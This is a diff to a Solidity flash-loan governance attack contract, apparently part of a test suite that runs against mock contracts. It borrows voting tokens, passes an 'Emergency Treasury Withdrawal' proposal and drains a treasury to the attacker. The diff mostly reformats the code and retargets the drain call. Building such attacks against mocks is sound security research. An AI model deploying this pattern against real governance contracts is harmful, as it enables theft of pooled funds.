@@ -34,12 +34,7 @@ import {IFlashLoanReceiver} from "../mocks/MockFlashLoanProvider.sol";
  */
 
 interface IFlashLoanProvider {
-    function flashLoan(
-        address token,
-        uint256 amount,
-        address receiver,
-        bytes calldata data
-    ) external returns (bool);
+    function flashLoan(address token, uint256 amount, address receiver, bytes calldata data) external returns (bool);
 
     function getFlashLoanFee(uint256 amount) external view returns (uint256);
 }
@@ -98,12 +93,7 @@ contract FlashLoanAttack is IFlashLoanReceiver {
     // Constructor
     // ─────────────────────────────────────────────────────────────────────────
 
-    constructor(
-        address _flashLoanProvider,
-        address _governanceToken,
-        address _governor,
-        address _targetTreasury
-    ) {
+    constructor(address _flashLoanProvider, address _governanceToken, address _governor, address _targetTreasury) {
         require(_flashLoanProvider != address(0), "Invalid flash loan provider");
         require(_governanceToken != address(0), "Invalid governance token");
         require(_governor != address(0), "Invalid governor");
@@ -136,8 +126,9 @@ contract FlashLoanAttack is IFlashLoanReceiver {
 
         // Request flash loan
         // The provider will call executeOperation() as a callback
-        try IFlashLoanProvider(flashLoanProvider).flashLoan(governanceToken, loanAmount, address(this), data)
-        returns (bool success) {
+        try IFlashLoanProvider(flashLoanProvider).flashLoan(governanceToken, loanAmount, address(this), data) returns (
+            bool success
+        ) {
             return success;
         } catch Error(string memory reason) {
             emit AttackFailed(reason);
@@ -160,12 +151,11 @@ contract FlashLoanAttack is IFlashLoanReceiver {
      * 3. Vote on proposal
      * 4. Execute proposal
      */
-    function executeOperation(
-        address token,
-        uint256 amount,
-        uint256 fee,
-        bytes calldata data
-    ) external override returns (bool) {
+    function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata data)
+        external
+        override
+        returns (bool)
+    {
         require(msg.sender == flashLoanProvider, "FlashLoanAttack: only flash loan provider can call");
         require(token == governanceToken, "FlashLoanAttack: token mismatch");
 
@@ -190,13 +180,13 @@ contract FlashLoanAttack is IFlashLoanReceiver {
         values[0] = 0;
 
         bytes[] memory calldatas = new bytes[](1);
-        // calldata for a simple transfer or withdrawal function
-        // For this generic attack, we assume a transfer() function signature
-        // In reality, we'd target specific treasury functions
-        calldatas[0] = abi.encodeWithSignature("approve(address,uint256)", address(this), treasuryDrainAmount);
+        // calldata for a simple withdrawal function on the treasury
+        // Here we target a real MockTreasury method to transfer funds to this contract
+        calldatas[0] =
+            abi.encodeWithSignature("withdrawWithinLimit(address,uint256)", address(this), treasuryDrainAmount);
 
         string memory description = "PROPOSAL: Emergency Treasury Withdrawal";
-        bytes32 descriptionHash = keccak256(abi.encodePacked(description));
+        bytes32 descriptionHash = _hashDescription(description);
 
         uint256 proposalId = IGovernor(governor).propose(targets, values, calldatas, description);
         emit ProposalCreated(proposalId, treasuryDrainAmount);
@@ -267,7 +257,13 @@ contract FlashLoanAttack is IFlashLoanReceiver {
         require(msg.sender == attacker, "Only attacker can recover");
         uint256 balance = IERC20(token).balanceOf(address(this));
         if (balance > 0) {
-            IERC20(token).transfer(to, balance);
+            require(IERC20(token).transfer(to, balance), "FlashLoanAttack: recover transfer failed");
+        }
+    }
+
+    function _hashDescription(string memory description) internal pure returns (bytes32 hash) {
+        assembly {
+            hash := keccak256(add(description, 32), mload(description))
         }
     }
 }
